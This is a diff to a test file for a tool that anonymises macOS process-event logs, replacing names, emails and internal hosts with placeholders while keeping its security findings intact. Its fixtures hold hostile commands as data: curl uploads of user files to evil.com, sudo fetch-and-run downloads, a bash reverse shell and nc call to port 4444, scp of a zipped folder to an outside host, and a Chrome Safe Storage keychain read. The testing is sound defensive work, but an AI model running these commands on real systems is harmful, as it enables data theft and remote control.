@@ -739,7 +739,7 @@ describe.skipIf(!fs.existsSync(JQ))('paths', () => {
     expect(exec.env).toContain(`OLDPWD=${exec.cwd.path}`);
   });
 
-  test('a path with extra leading slashes, or ~name/, is cleaned; a URL\'s //host is left for the host step', () => {
+  test('a path with extra leading slashes, or ~name/, is cleaned; a URL is left for the host step', () => {
     const open = sysProc(312, '/usr/bin/open');
     const input = esExec(zsh, open, {
       args: ['open', '//Users/jdoe/Documents/Board.pdf', '~jdoe/Documents/Payroll.xlsx', 'https://example.com/a'],
@@ -750,7 +750,7 @@ describe.skipIf(!fs.existsSync(JQ))('paths', () => {
     const names = keyed(r.key, 'name');
     const exec = events(r.out)[0]!.event.exec;
     expect(exec.args).toEqual(['open', `//Users/user1/Documents/${names.get('Board.pdf')}`, `~user1/Documents/${names.get('Payroll.xlsx')}`,
-      'https://example.com/a']);
+      `https://example.com/${names.get('a')}`]);
     expect(exec.cwd.path).toBe(`//Users/user1/${names.get('Secret')}`);
   });
 
@@ -944,7 +944,8 @@ describe.skipIf(!fs.existsSync(JQ))('arguments and text', () => {
     const args = events(r.out).map(e => e.event.exec.args as string[]);
     expect(args[0]!.slice(0, 4)).toEqual(['curl', '-H', 'Accept: text/html', '-o']);
     expect(args[0]![4]).toMatch(/^name\d+\.py$/);
-    expect(args[0]![5]).toBe('https://example.com/a/b.py');
+    const n = keyed(r.key, 'name');
+    expect(args[0]![5]).toBe(`https://example.com/${n.get('a')}/${n.get('b.py')}`);
     expect(args[1]!.slice(0, 3)).toEqual(['launchctl', 'bootstrap', 'gui/501']);
     expect(args[1]![3]).toMatch(/^name\d+\.plist$/);
     expect(args[2]).toEqual(['security', 'find-generic-password', '-s', 'Chrome Safe Storage', '-w']);
@@ -1200,9 +1201,13 @@ describe.skipIf(!fs.existsSync(JQ))('arguments and text', () => {
     const r = runClean(['clean', '-o', '-'], { input });
     expect(r.status, r.stderr).toBe(0);
     const args = events(r.out).map(e => e.event.exec.args as string[]);
-    expect(args[2]).toEqual(['wget', 'localhost:8080/x']);
-    expect(args[3]).toEqual(['wget', 'intranet:8080/a.sh']);
-    expect(args[4]).toEqual(['wget', 'intranet/a.sh']);
+    // A URL's path is cleaned like names in a cleaned place, and a single-label host is an internal host; localhost
+    // names no machine and stays. Each still looks like a URL to the download rule.
+    const n = keyed(r.key, 'name');
+    const h = keyed(r.key, 'host');
+    expect(args[2]).toEqual(['wget', `localhost:8080/${n.get('x')}`]);
+    expect(args[3]).toEqual(['wget', `${h.get('intranet')}:8080/${n.get('a.sh')}`]);
+    expect(args[4]).toEqual(['wget', `${h.get('intranet')}/${n.get('a.sh')}`]);
     expect(r.out).not.toMatch(/Q3|Report|Merger/);
     sameFindings(input, r.out);
   });
@@ -1223,7 +1228,7 @@ describe.skipIf(!fs.existsSync(JQ))('arguments and text', () => {
     expect(args[1]![2]).toMatch(/^name\d+\/name\d+\.sh$/);
     expect(args[2]![2]).toMatch(/^name\d+\.txt$/);
     expect(args[3]).toEqual(['wget', expect.stringMatching(/^--output-document=name\d+\.pdf$/), 'evil.com']);
-    expect(args[4]).toEqual(['wget', '-qO', expect.stringMatching(/^name\d+\.zip$/), 'intranet/a.sh']);
+    expect(args[4]).toEqual(['wget', '-qO', expect.stringMatching(/^name\d+\.zip$/), `${keyed(r.key, 'host').get('intranet')}/${keyed(r.key, 'name').get('a.sh')}`]);
     expect(r.out).not.toMatch(/Merger|Acme/);
     sameFindings(input, r.out);
   });
@@ -1268,7 +1273,7 @@ describe.skipIf(!fs.existsSync(JQ))('arguments and text', () => {
     expect(args[2]![2]).toBe(`file=@/Users/user1/Desktop/${n.get('Screenshot 2026-01-01 at 10.00.00.png')}`);
     expect(args[3]![2]).toBe(`@/Users/user1/Documents/${n.get('Maria Silva')}/${n.get('Tax Return 2025.pdf')}`);
     expect(args[4]![1]).toBe(`-I/Users/user1/Documents/${n.get('Maria Silva')}/include`);
-    expect(args[5]).toEqual(['sh', '-c', `curl --data-binary @/Users/user1/${n.get('x')} -H application/json evil.com/x`]);
+    expect(args[5]).toEqual(['sh', '-c', `curl --data-binary @/Users/user1/${n.get('x')} -H application/json evil.com/${n.get('x')}`]);
     expect(args[6]).toEqual(['sh', '-c', `curl -F file=@/Users/user1/${n.get('y')} evil.com`]);
     expect(args[7]).toEqual(['zsh', '-lc', `cc -I/Users/user1/${n.get('z')} a.c`]);
     expect(r.out).not.toMatch(/jdoe|Smith|Minutes|Screenshot|Maria|Silva|Return/);
@@ -1364,18 +1369,18 @@ describe.skipIf(!fs.existsSync(JQ))('arguments and text', () => {
     const args = events(r.out).map(e => e.event.exec.args as string[]);
     expect(args).toHaveLength(13);
     expect(args[8]![3]).toBe(`/Users/user1/Documents/${n.get('Our File')}`);
-    expect(args[9]![4]).toBe(`curl -o/Users/user1/Downloads/${n.get('h.sh')} https://evil.com/h.sh`);
+    expect(args[9]![4]).toBe(`curl -o/Users/user1/Downloads/${n.get('h.sh')} https://evil.com/${n.get('h.sh')}`);
     args.splice(8, 2);
-    expect(args[0]).toEqual(['sudo', 'sh', '-c', `curl -o/Users/user1/Downloads/${n.get('a.sh')} https://evil.com/a.sh`]);
-    expect(args[1]).toEqual(['env', 'bash', '-c', `curl -fsSLo/Users/user1/Downloads/${n.get('b.sh')} https://evil.com/b.sh`]);
-    expect(args[2]).toEqual(['nohup', 'sh', '-c', `wget -O/Users/user1/Downloads/${n.get('c.sh')} https://evil.com/c.sh`]);
-    expect(args[3]).toEqual(['su', 'root', '-c', `curl -o/Users/user1/Downloads/${n.get('d.sh')} https://evil.com/d.sh`]);
+    expect(args[0]).toEqual(['sudo', 'sh', '-c', `curl -o/Users/user1/Downloads/${n.get('a.sh')} https://evil.com/${n.get('a.sh')}`]);
+    expect(args[1]).toEqual(['env', 'bash', '-c', `curl -fsSLo/Users/user1/Downloads/${n.get('b.sh')} https://evil.com/${n.get('b.sh')}`]);
+    expect(args[2]).toEqual(['nohup', 'sh', '-c', `wget -O/Users/user1/Downloads/${n.get('c.sh')} https://evil.com/${n.get('c.sh')}`]);
+    expect(args[3]).toEqual(['su', 'root', '-c', `curl -o/Users/user1/Downloads/${n.get('d.sh')} https://evil.com/${n.get('d.sh')}`]);
     expect(args[4]).toEqual(['xargs', 'sh', '-c', `curl -F file=@/Users/user1/${n.get('x')} evil.com`]);
-    expect(args[5]).toEqual(['sudo', '/bin/zsh', '-lc', `curl -d@/Users/user1/${n.get('y')} https://evil.com/e.sh`]);
-    expect(args[6]).toEqual(['sh', '-c', `/Users/user1/Downloads/${n.get('f.sh')} https://evil.com/f`]);
+    expect(args[5]).toEqual(['sudo', '/bin/zsh', '-lc', `curl -d@/Users/user1/${n.get('y')} https://evil.com/${n.get('e.sh')}`]);
+    expect(args[6]).toEqual(['sh', '-c', `/Users/user1/Downloads/${n.get('f.sh')} https://evil.com/${n.get('f')}`]);
     expect(args[7]![4]).toBe(`/Users/user1/Documents/${n.get('My File')}`);
-    expect(args[8]).toEqual(['sudo', 'sh', '-c', `curl -o ${n.get('out.sh')} evil.com/q.sh`]);
-    expect(args[9]).toEqual(['env', 'bash', '-c', `curl -o/Users/user1/Downloads/${n.get('g.sh')} https://evil.com/g.sh`]);
+    expect(args[8]).toEqual(['sudo', 'sh', '-c', `curl -o ${n.get('out.sh')} evil.com/${n.get('q.sh')}`]);
+    expect(args[9]).toEqual(['env', 'bash', '-c', `curl -o/Users/user1/Downloads/${n.get('g.sh')} https://evil.com/${n.get('g.sh')}`]);
     expect(args[10]).toEqual(['su', 'root', '-c', `curl -F file=@/Users/user1/${n.get('z')} evil.com`]);
     for (const real of ['a.sh', 'b.sh', 'c.sh', 'd.sh', 'f.sh', 'g.sh', 'x', 'y', 'z', 'My File']) expect(n.has(real), real).toBe(true);
     for (const real of n.keys()) expect(real, real).not.toMatch(/\s\S*(?:https?|evil|:\/\/|\.com)|^curl|^wget/);
@@ -1412,7 +1417,7 @@ describe.skipIf(!fs.existsSync(JQ))('arguments and text', () => {
     expect(args[2]![4]).toBe(`${n.get('Board Docs')}/${n.get('plan.pdf')}`);
     expect(args[3]![3]).toBe(`cat ${n.get('HR')}/${n.get('Pay.pdf')}`);
     expect(args[4]![2]).toBe(`cat ${n.get('Acme')}/${n.get('a.pdf')} 2>/dev/null > ${n.get('out')}/${n.get('b.txt')}; zip -r ${n.get('deal.zip')} "${n.get('Deal Room')}" && scp ${n.get('deal.zip')} bob@evil.com:/tmp/ | tee ${n.get('Notes')}/${n.get('x.log')}`);
-    expect(args[5]![2]).toBe(`open ${n.get('Merger Deck.key')}; rm ${n.get('Delta')}/*.pdf; curl -H "Accept: text/html" -o ${n.get('page.html')} https://evil.com/Delta/p.html`);
+    expect(args[5]![2]).toBe(`open ${n.get('Merger Deck.key')}; rm ${n.get('Delta')}/*.pdf; curl -H "Accept: text/html" -o ${n.get('page.html')} https://evil.com/${n.get('Delta')}/${n.get('p.html')}`);
     expect(args[6]![2]).toBe('security find-generic-password -s "Chrome Safe Storage" -w; launchctl load gui/501/x; git commit -m wip');
     expect(args[7]![2]).toBe('print(open("Gamma/notes.txt").read())');
     expect(args[8]![2]).toBe('cat Foo/bar.txt');
@@ -1433,9 +1438,9 @@ describe.skipIf(!fs.existsSync(JQ))('arguments and text', () => {
     const n = keyed(r.key, 'name');
     const args = events(r.out).map(e => e.event.exec.args as string[]);
     expect(args).toEqual([
-      ['-zsh', '-c', `curl -o/Users/user1/Downloads/${n.get('a.sh')} https://evil.com/a.sh`],
-      ['-su', '-c', `curl -o/Users/user1/Downloads/${n.get('b.sh')} https://evil.com/b.sh`],
-      ['-bash', '-lc', `curl -o/Users/user1/Downloads/${n.get('c.sh')} https://evil.com/c.sh`],
+      ['-zsh', '-c', `curl -o/Users/user1/Downloads/${n.get('a.sh')} https://evil.com/${n.get('a.sh')}`],
+      ['-su', '-c', `curl -o/Users/user1/Downloads/${n.get('b.sh')} https://evil.com/${n.get('b.sh')}`],
+      ['-bash', '-lc', `curl -o/Users/user1/Downloads/${n.get('c.sh')} https://evil.com/${n.get('c.sh')}`],
     ]);
     for (const real of ['a.sh', 'b.sh', 'c.sh']) expect(n.has(real), real).toBe(true);
     sameFindings(input, r.out);
@@ -1673,13 +1678,13 @@ describe.skipIf(!fs.existsSync(JQ))('seeds', () => {
   test('an account named like a rule word is replaced in paths but stays as a bare word, and is listed', () => {
     const input = [
       esCreate(zsh, { path: '/Users/test/Documents/plan.txt' }, 1),
-      run(920, '/bin/sh', ['sh', '-c', 'npm test && echo test@host.example.com'], '/', 2, ['HOME=/Users/test']),
+      run(920, '/bin/sh', ['sh', '-c', 'npm test && ssh test@host.example.com'], '/', 2, ['HOME=/Users/test']),
     ].join('\n') + '\n';
     const r = runClean(['clean', '-o', '-'], { input });
     expect(r.status, r.stderr).toBe(0);
     const ev = events(r.out);
     expect(ev[0]!.event.create.destination.existing_file.path).toMatch(/^\/Users\/user1\/Documents\/name\d+\.txt$/);
-    expect(ev[1]!.event.exec.args[2]).toBe('npm test && echo user1@host.example.com');
+    expect(ev[1]!.event.exec.args[2]).toBe('npm test && ssh user1@host.example.com');
     expect(ev[1]!.event.exec.env).toEqual(['HOME=/Users/user1']);
     expect(r.summary['short or common account names']).toBe('test');
   });
@@ -1902,6 +1907,188 @@ describe.skipIf(!fs.existsSync(JQ))('seeds', () => {
     expect(r.status, r.stderr).toBe(0);
     const args = events(r.out).map(e => e.event.exec.args as string[]);
     expect(args[0]![2]).toBe('display dialog "Hi Person 1" with hidden answer');
-    expect(args[1]).toEqual(['echo', 'user1', 'user1@corp.example']);
+    // person@corp.example is an email (step 5); its placeholder is not cleaned again by the account person.
+    expect(args[1]).toEqual(['echo', 'user1', 'person1@example.invalid']);
+  });
+});
+
+// ---- emails, internal hosts and URLs ----------------------------------------------------------------------------
+describe.skipIf(!fs.existsSync(JQ))('hosts', () => {
+  const child = (pid: number): ReturnType<typeof esProc> => esProc({ pid, path: '/bin/zsh', platform: true, signingId: 'com.apple.zsh', ppid: 300 });
+  const sysImage = (pid: number, p: string): ReturnType<typeof esProc> =>
+    esProc({ pid, pidversion: pid + 2000, path: p, platform: true, signingId: `com.apple.${p.split('/').pop()!}`, ppid: 300 });
+  const run = (pid: number, p: string, args: string[], cwd: string, seq: number, env: string[] = JDOE_ENV): string =>
+    esExec(child(pid), sysImage(pid, p), { args, cwd, env, seq });
+  const sameFindings = (raw: string, out: string): void => {
+    expect(findingSignature(buildModel(lines(out)))).toEqual(findingSignature(buildModel(lines(raw))));
+  };
+  const seedFile = (rows: [string, string][]): string => {
+    const f = path.join(tmpDir(), 'seeds.tsv');
+    fs.writeFileSync(f, rows.map(([k, v]) => `${k}\t${v}\n`).join(''));
+    return f;
+  };
+  const docs = '/Users/jdoe/Documents';
+
+  test('emails become placeholders', () => {
+    const input = [
+      run(1100, '/usr/bin/git', ['git', 'config', 'user.email', 'jane.doe@acme.com'], '/', 1, [...JDOE_ENV, 'EMAIL=jane.doe@acme.com']),
+      run(1101, '/bin/sh', ['sh', '-c', 'echo "mail Jane.Doe@Acme.com <bob+x@mail.example.org>" | tee /tmp/m.txt'], '/', 2),
+      // Not emails: a retina image name, a curl upload, a package version.
+      run(1102, '/bin/echo', ['echo', 'icon@2x.png', '@/usr/share/a.json', 'react@18.3.1'], '/', 3),
+    ].join('\n') + '\n';
+    const r = runClean(['clean', '-o', '-'], { input });
+    expect(r.status, r.stderr).toBe(0);
+    const ev = events(r.out);
+    expect(ev[0]!.event.exec.args).toEqual(['git', 'config', 'user.email', 'person1@example.invalid']);
+    expect(ev[0]!.event.exec.env).toContain('EMAIL=person1@example.invalid');
+    // An address has one placeholder whatever its case.
+    expect(ev[1]!.event.exec.args[2]).toBe(`echo "mail person1@example.invalid <person2@example.invalid>" | tee /tmp/${keyed(r.key, 'name').get('m.txt')}`);
+    expect(ev[2]!.event.exec.args).toEqual(['echo', 'icon@2x.png', '@/usr/share/a.json', 'react@18.3.1']);
+    expect(keyed(r.key, 'email')).toEqual(new Map([['jane.doe@acme.com', 'person1@example.invalid'], ['bob+x@mail.example.org', 'person2@example.invalid']]));
+    expect(r.summary['placeholders email']).toBe('2');
+    expect(r.out).not.toMatch(/jane|bob\+x|acme/i);
+    sameFindings(input, r.out);
+  });
+
+  test('internal hosts are cleaned anywhere', () => {
+    const input = [
+      run(1110, '/usr/bin/open', ['open', 'https://wiki.acme.com/x'], '/', 1),
+      run(1111, '/usr/bin/ssh', ['ssh', 'build01.corp'], '/', 2),
+      run(1112, '/usr/bin/git', ['git', 'clone', 'git@git.acme.com:team/repo.git'], '/', 3),
+      run(1113, '/usr/bin/nc', ['nc', '10.0.0.5', '4444'], '/', 4, [...JDOE_ENV, 'HTTP_PROXY=http://proxy.lan:3128']),
+      run(1114, '/bin/sh', ['sh', '-c', 'ping -c1 192.168.1.20 && ssh admin@nas.home.arpa uptime; ping6 fe80::1%en0; scp x deploy@buildbox:/srv/'], '/', 5),
+      // A host seed with .local is one host; so is the same host in any case.
+      run(1115, '/sbin/ping', ['ping', 'Janes-MacBook-Pro.local'], '/', 6),
+      run(1116, '/usr/bin/ssh', ['ssh', 'jdoe@janes-macbook-pro.local', 'BUILD01.CORP'], '/', 7),
+      run(1117, '/usr/bin/curl', ['curl', '-o', '/tmp/r', 'http://172.16.4.2:8080/r', 'https://[fd12:3456::1]/x'], '/', 8),
+      run(1118, '/bin/sh', ['sh', '-c', 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'], '/', 9),
+      // Inside a path a host seed is replaced as a part; with .local after it, the whole is the host.
+      esCreate(zsh, { path: '/Library/Caches/Janes-MacBook-Pro.local/x.db' }, 10),
+    ].join('\n') + '\n';
+    const r = runClean(['clean', '-o', '-', '-D', 'acme.com', '-S', seedFile([['user', 'jdoe'], ['host', 'Janes-MacBook-Pro']])], { input });
+    expect(r.status, r.stderr).toBe(0);
+    const ev = events(r.out);
+    const args = ev.filter(e => e.event.exec).map(e => e.event.exec.args as string[]);
+    const h = keyed(r.key, 'host');
+    expect(h.get('Janes-MacBook-Pro')).toBe('host1.internal.invalid');
+    expect(args[0]).toEqual(['open', `https://${h.get('wiki.acme.com')}/${keyed(r.key, 'name').get('x')}`]);
+    expect(args[1]).toEqual(['ssh', h.get('build01.corp')]);
+    expect(args[2]![2]).toBe(`git@${h.get('git.acme.com')}:team/repo.git`);
+    expect(args[3]).toEqual(['nc', h.get('10.0.0.5'), '4444']);
+    expect(ev[3]!.event.exec.env).toContain(`HTTP_PROXY=http://${h.get('proxy.lan')}:3128`);
+    expect(args[4]![2]).toBe(`ping -c1 ${h.get('192.168.1.20')} && ssh admin@${h.get('nas.home.arpa')} uptime; ping6 ${h.get('fe80::1')}%en0; scp x deploy@${h.get('buildbox')}:/srv/`);
+    expect(args[5]).toEqual(['ping', 'host1.internal.invalid']);
+    expect(args[6]).toEqual(['ssh', 'user1@host1.internal.invalid', h.get('build01.corp')]);
+    const n = keyed(r.key, 'name');
+    expect(args[7]).toEqual(['curl', '-o', `/tmp/${n.get('r')}`, `http://${h.get('172.16.4.2')}:8080/${n.get('r')}`, `https://${h.get('fd12:3456::1')}/${n.get('x')}`]);
+    expect(args[8]![2]).toBe(`bash -i >& /dev/tcp/${h.get('10.0.0.5')}/4444 0>&1`);
+    expect(ev[9]!.event.create.destination.existing_file.path).toBe('/Library/Caches/host1.internal.invalid/x.db');
+    for (const v of h.values()) expect(v).toMatch(/^host\d+\.internal\.invalid$/);
+    expect(r.out).not.toMatch(/acme|build01|corp\b|10\.0\.0\.5|proxy\.lan|192\.168|nas\.home|fe80|buildbox|janes|172\.16|fd12/i);
+    sameFindings(input, r.out);
+  });
+
+  test('public hosts stay, their URLs are cleaned', () => {
+    const url = 'https://user:pw@evil.example.net/drop/Board.pdf?id=42&t=x';
+    const input = [
+      run(1120, '/usr/bin/curl', ['curl', '-o', '/tmp/p', url], '/', 1),
+      run(1121, '/bin/sh', ['sh', '-c', `curl -o /tmp/q "${url}#frag" | tee /tmp/log`], '/', 2),
+      // Not hosts: kept paths with a version that looks like an address, perl's ::, a public address.
+      run(1122, '/usr/bin/perl', ['perl', '-MFile::Basename', '-e', 'print 1'], '/', 3),
+      esCreate(zsh, { path: '/Library/Frameworks/X.framework/Versions/10.0.0.5/X' }, 4),
+      run(1123, '/sbin/ping', ['ping', '8.8.8.8'], '/', 5),
+      run(1124, '/usr/bin/curl', ['curl', '-A', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/110.0.0.0', '-o', '/dev/null', 'evil.example.net'], '/', 6),
+      run(1125, '/bin/sh', ['sh', '-c', 'date +%H:%M:%S; echo 10:30:00 v10.0.0.1'], '/', 7),
+    ].join('\n') + '\n';
+    const r = runClean(['clean', '-o', '-'], { input });
+    expect(r.status, r.stderr).toBe(0);
+    const ev = events(r.out);
+    const n = keyed(r.key, 'name');
+    const d = keyed(r.key, 'data');
+    const cleaned = `https://evil.example.net/${n.get('drop')}/${n.get('Board.pdf')}?id=${d.get('42')}&t=${d.get('x')}`;
+    expect(n.get('Board.pdf')).toMatch(/^name\d+\.pdf$/);
+    expect(ev[0]!.event.exec.args).toEqual(['curl', '-o', `/tmp/${n.get('p')}`, cleaned]);
+    expect(ev[1]!.event.exec.args[2]).toBe(`curl -o /tmp/${n.get('q')} "${cleaned}#${d.get('frag')}" | tee /tmp/${n.get('log')}`);
+    expect(ev[2]!.event.exec.args).toEqual(['perl', '-MFile::Basename', '-e', 'print 1']);
+    expect(ev[3]!.event.create.destination.existing_file.path).toBe('/Library/Frameworks/X.framework/Versions/10.0.0.5/X');
+    expect(ev[4]!.event.exec.args).toEqual(['ping', '8.8.8.8']);
+    expect(ev[5]!.event.exec.args).toEqual(['curl', '-A', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/110.0.0.0', '-o', '/dev/null', 'evil.example.net']);
+    expect(ev[6]!.event.exec.args[2]).toBe('date +%H:%M:%S; echo 10:30:00 v10.0.0.1');
+    expect(r.out).not.toMatch(/user:pw|Board|drop/);
+    // The user info is a credential: removed and counted, never in the key.
+    expect(r.summary['redacted']).toBe('2');
+    expect(r.key).not.toMatch(/user:pw|"pw"/);
+    expect(r.summary['placeholders host']).toBe('0');
+    sameFindings(input, r.out);
+  });
+
+  test('a host in a URL position stays a host: before relative names, and the same in a shell and its child', () => {
+    const input = [
+      esCreate(zsh, { path: `${docs}/acme/notes.txt` }, 1),
+      // Under a home cwd, a curl or wget argument is a URL; bash's is a file.
+      run(1130, '/usr/bin/curl', ['curl', 'evil.sh'], docs, 2),
+      run(1131, '/usr/local/bin/wget', ['wget', 'evil.sh/a'], docs, 3),
+      run(1132, '/bin/bash', ['bash', 'evil.sh'], docs, 4),
+      // A single-label host in a URL position is an internal host, in the shell code and in the child it runs.
+      run(1133, '/bin/sh', ['sh', '-c', 'wget intranet/a.sh'], docs, 5),
+      run(1134, '/usr/local/bin/wget', ['wget', 'intranet/a.sh'], docs, 6),
+      // acme is a folder name too; before :8080 in a URL it is a host.
+      run(1135, '/usr/bin/curl', ['curl', 'acme:8080/p'], docs, 7),
+      run(1136, '/bin/sh', ['sh', '-c', 'curl -s acme:8080/p -o out.txt'], docs, 8),
+      run(1137, '/usr/local/bin/wget', ['wget', 'localhost:8080/x'], docs, 9),
+      // A file name where a URL would be is still a file name: no top-level domain is called pdf.
+      run(1138, '/usr/bin/curl', ['curl', 'Board.pdf'], docs, 10),
+      run(1139, '/usr/local/bin/wget', ['wget', 'Merger.pdf', 'Deal.txt/x'], docs, 11),
+    ].join('\n') + '\n';
+    for (const stdin of [false, true]) {
+      const r = runClean(stdin ? ['clean', '-i', '-', '-o', '-'] : ['clean', '-o', '-'], { input });
+      expect(r.status, r.stderr).toBe(0);
+      const args = events(r.out).filter(e => e.event.exec).map(e => e.event.exec.args as string[]);
+      const n = keyed(r.key, 'name');
+      const h = keyed(r.key, 'host');
+      expect(args[0]).toEqual(['curl', 'evil.sh']);
+      expect(args[1]).toEqual(['wget', `evil.sh/${n.get('a')}`]);
+      expect(args[2]).toEqual(['bash', n.get('evil.sh')]);
+      expect(n.get('evil.sh')).toMatch(/^name\d+\.sh$/);
+      const intranet = `${h.get('intranet')}/${n.get('a.sh')}`;
+      expect(args[3]).toEqual(['sh', '-c', `wget ${intranet}`]);
+      expect(args[4]).toEqual(['wget', intranet]);
+      expect(n.has('intranet')).toBe(false);
+      expect(args[5]).toEqual(['curl', `${h.get('acme')}:8080/${n.get('p')}`]);
+      expect(args[6]![2]).toBe(`curl -s ${h.get('acme')}:8080/${n.get('p')} -o ${n.get('out.txt')}`);
+      expect(h.get('acme')).toMatch(/^host\d+\.internal\.invalid$/);
+      expect(n.get('acme')).toMatch(/^name\d+$/);
+      expect(args[7]).toEqual(['wget', `localhost:8080/${n.get('x')}`]);
+      expect(args[8]).toEqual(['curl', n.get('Board.pdf')]);
+      expect(args[9]).toEqual(['wget', n.get('Merger.pdf'), `${n.get('Deal.txt')}/${n.get('x')}`]);
+      expect(r.out).not.toMatch(/Board|Merger|Deal/);
+      sameFindings(input, r.out);
+    }
+  });
+
+  test('a host or address met again, in later events, a loaded key or another case, keeps its placeholder', () => {
+    const proxy = 'HTTP_PROXY=http://bob:secret@Proxy.LAN:3128';
+    const input = [
+      run(1140, '/usr/bin/true', ['true'], '/', 1, [...JDOE_ENV, proxy, 'EMAIL=Jane.Doe@acme.com']),
+      run(1141, '/usr/bin/true', ['true'], '/', 2, [...JDOE_ENV, proxy, 'EMAIL=Jane.Doe@acme.com']),
+      run(1142, '/usr/bin/ssh', ['ssh', 'proxy.lan'], '/', 3),
+    ].join('\n') + '\n';
+    const key = path.join(tmpDir(), 'shared.key.tsv');
+    const first = runClean(['clean', '-o', '-', '-k', key], { input });
+    expect(first.status, first.stderr).toBe(0);
+    const ev = events(first.out);
+    expect(ev[0]!.event.exec.env).toEqual(expect.arrayContaining(['HTTP_PROXY=http://host1.internal.invalid:3128', 'EMAIL=person1@example.invalid']));
+    expect(ev[1]!.event.exec.env).toEqual(ev[0]!.event.exec.env);
+    expect(ev[2]!.event.exec.args).toEqual(['ssh', 'host1.internal.invalid']);
+    // Each user info removed is counted, in every event it is in.
+    expect(first.summary['redacted']).toBe('2');
+    expect(parseKey(first.key).filter(k => k.kind === 'host' || k.kind === 'email').map(k => k.placeholder))
+      .toEqual(['host1.internal.invalid', 'person1@example.invalid']);
+    const again = run(1143, '/usr/bin/ssh', ['ssh', 'PROXY.lan', 'echo jane.doe@ACME.com'], '/', 1) + '\n';
+    const second = runClean(['clean', '-o', '-', '-k', key], { input: again });
+    expect(second.status, second.stderr).toBe(0);
+    expect(events(second.out)[0]!.event.exec.args).toEqual(['ssh', 'host1.internal.invalid', 'echo person1@example.invalid']);
+    expect(second.summary['placeholders host']).toBe('0');
+    expect(second.summary['placeholders email']).toBe('0');
   });
 });
